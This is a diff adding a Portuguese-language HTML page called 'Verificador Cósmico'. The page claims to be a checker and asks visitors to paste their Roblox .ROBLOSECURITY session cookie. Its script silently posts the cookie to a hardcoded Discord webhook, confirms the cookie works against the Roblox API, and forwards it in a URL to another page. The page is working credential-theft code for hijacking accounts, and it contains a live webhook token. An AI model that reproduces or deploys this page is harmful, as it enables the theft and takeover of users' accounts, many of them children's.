@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Verificador Cósmico</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+  body{background:radial-gradient(circle at top left,#0f0c29,#302b63,#24243e);height:100vh;display:flex;justify-content:center;align-items:center;color:#eee}
+  .container{background:rgba(40,40,60,.8);backdrop-filter:blur(8px);border:2px solid #5c5cff33;box-shadow:0 0 25px #5c5cff66;padding:30px;border-radius:15px;width:340px;text-align:center}
+  .container h2{margin-bottom:20px;font-size:24px;color:#9fa8ff;text-shadow:0 0 5px #6b6bff}
+  input{width:100%;padding:12px;background:#1a1a2e;border:1px solid #6c63ff55;border-radius:8px;color:#fff;margin-bottom:15px;outline:none}
+  button{width:100%;padding:12px;background:linear-gradient(90deg,#6a5acd,#7b68ee);border:none;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer;box-shadow:0 0 12px #7b68ee99;transition:.3s}
+  button:hover{filter:brightness(1.1)}
+  .msg{color:#ff5e5e;font-size:14px;margin-top:12px}
+  .overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.9);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:99}
+  .orb{width:70px;height:70px;border-radius:50%;background:radial-gradient(circle,#00f2ff,#0061ff);animation:pulse 1.2s infinite ease-in-out;box-shadow:0 0 30px #00f2ff88;margin-bottom:18px}
+  @keyframes pulse{0%{transform:scale(1);opacity:.8}50%{transform:scale(1.2);opacity:1}100%{transform:scale(1);opacity:.8}}
+  .success{font-size:18px;color:#00ffcc;text-shadow:0 0 8px #00ffcc;animation:blink 1s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Verificador Cósmico</h2>
+  <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY" autocomplete="off" />
+  <button onclick="enviar()" id="btn">ENVIAR</button>
+  <div class="msg" id="msg"></div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="orb" id="orb"></div>
+  <div class="success" style="display:none;" id="successText">ENVIADO COM SUCESSO</div>
+</div>
+
+<script>
+  let bloqueado = false;
+  async function enviar() {
+    if (bloqueado) return;
+
+    const input = document.getElementById("cookie");
+    const cookie = input.value.trim();
+    const msg = document.getElementById("msg");
+    const overlay = document.getElementById("overlay");
+    const orb = document.getElementById("orb");
+    const successText = document.getElementById("successText");
+
+    msg.textContent = "";
+    if (!cookie) {
+      msg.textContent = "Coloque o cookie antes de enviar.";
+      return;
+    }
+
+    overlay.style.display = "flex";
+    orb.style.display = "block";
+    successText.style.display = "none";
+
+    // Manda pro webhook
+    await fetch("https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3", {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        embeds: [{
+          title: "COOKIE DETECTADO",
+          description: `\`\`\`${cookie}\`\`\``,
+          color: 16711680,
+          footer: {
+            text: "Sistema Espacial .ROBLOSECURITY",
+            icon_url: "https://cdn-icons-png.flaticon.com/512/702/702797.png"
+          }
+        }]
+      })
+    });
+
+    // Verifica no Roblox
+    const res = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+
+    if (res.status === 200) {
+      orb.style.display = "none";
+      successText.style.display = "block";
+      bloqueado = true;
+
+      setTimeout(() => {
+        window.location.href = `options.html?cookie=${encodeURIComponent(cookie)}`;
+      }, 2000);
+
+    } else {
+      overlay.style.display = "none";
+      msg.textContent = "Cookie inválido para Roblox.";
+      bloqueado = true;
+    }
+  }
+</script>
+
+</body>
+</html>
